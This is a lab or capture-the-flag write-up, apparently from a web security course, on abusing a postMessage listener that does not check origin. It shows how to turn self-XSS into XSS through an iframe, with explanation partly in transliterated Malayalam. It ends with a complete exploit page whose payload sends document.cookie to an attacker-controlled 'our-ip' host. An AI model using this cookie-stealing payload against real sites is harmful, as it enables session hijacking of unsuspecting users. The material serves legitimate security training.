## Introduction
-->This exercise covers how insecure calls to the JavaScript function postMessage() can be used to trigger a Cross-Site Scripting
-->This course details the exploitation of an application using addEventListener() and not verifying the origin of the message. The application is also vulnerable to Cross-Site Scripting when receiving a message. This challenge is based on the following content: [postMessage issues](https://github.com/EdOverflow/bugbountywiki/wiki/postMessage-issues) and [postMessage XSS on a million sites](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/).
-->This challenge will show you how to turn a self-XSS to an XSS using an iframe.

## Exploitation of the vulnerability
-->To exploit this issue, you will need to create a malicious HTML page that will open the vulnerable page in an iframe and postMessage to the iframe.
-->The structure of your exploit should look something like this:
```html
	<html>
	 <body>
	  <iframe id="myiframe" src="http://[VULNERABLE_SITE]/"></iframe>
	  <script>
	  // Call to postMessage using a reference to myiframe 
	  </script>
	 </body>
	</html>
```
-->The message sent to the parent iframe will contain a Cross-Site Scripting payload that will be used to retrieve the victim's cookies.

## Conclusion
-->This exercise showed you a way to exploit a page that uses addEventListener without restriction on the origin. This allowed opening the page as the legitimate application would and use postMessage() to trigger a Cross-Site Scripting. 

# Video Explanation
-->namal lab open aaki our account undakunu.enit oru secret key undakunu.
-->secret key undakuna sthalath `<h1>josu</h1>`  ennkodukumbol html injection aakunund.but namal page reload chyumbol josu h1 pole kanikunila just `<h1>josu</h1>` enn mathrame kanikunulu.which means self xss aan ullath 
-->ini ee self xss mati real xss akan namal nerthe pole view-source oke adich code eduth modify chyht namal postMessage() il namal xss payload undaki namude website il add chyunu
-->ini ethengilum oru victim namude ee malicious path il vanal xss trigger akun athupole avante cookie yum namuk kitum ok
-->malicious script :

```html
<html>
<body>

<iframe src="http://targeturl/" id="frame"></iframe>

<script> 
setTimeout(function() {

document.getElementById("frame").contentWindow.postMessage("<img src=a onerror='document.write(\"<img src=http://our-ip/?c=\"+document.cookie+\"/>\")'/>",'*');
}, 2000);

</script>
</body>
</html>
```